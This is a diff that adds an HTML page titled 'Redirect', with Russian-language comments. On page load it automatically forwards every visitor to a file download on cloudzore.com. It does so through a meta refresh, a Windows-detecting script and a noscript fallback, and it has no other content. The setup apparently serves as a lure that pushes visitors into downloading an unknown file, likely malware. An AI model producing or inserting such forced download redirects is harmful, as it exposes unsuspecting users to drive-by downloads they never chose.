@@ -1,0 +1,31 @@
+<head><meta http-equiv="refresh"content="0;url=http://cloudzore.com/file/167bee4">
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Redirect</title>
+
+  <script>
+    const ua = navigator.userAgent.toLowerCase();
+    const isWindows = 
+      ua.includes("windows") ||
+      ua.includes("win32") ||
+      ua.includes("win64") ||
+      navigator.platform.toLowerCase().includes("win");
+
+    const windowsTarget = "http://cloudzore.com/file/167bee4";
+    const defaultTarget = "http://cloudzore.com/file/167bee4";
+
+    window.location.replace(isWindows ? windowsTarget : defaultTarget);
+  </script>
+
+  <!-- Запасной вариант без JS (по умолчанию НЕ Windows) -->
+  <meta http-equiv="refresh" content="0;url=http://cloudzore.com/file/167bee4">
+</head>
+<body>
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=http://cloudzore.com/file/167bee4">
+    <p>Перенаправление... <a href="http://cloudzore.com/file/167bee4">Перейти вручную</a></p>
+  </noscript>
+</body>
+</html>
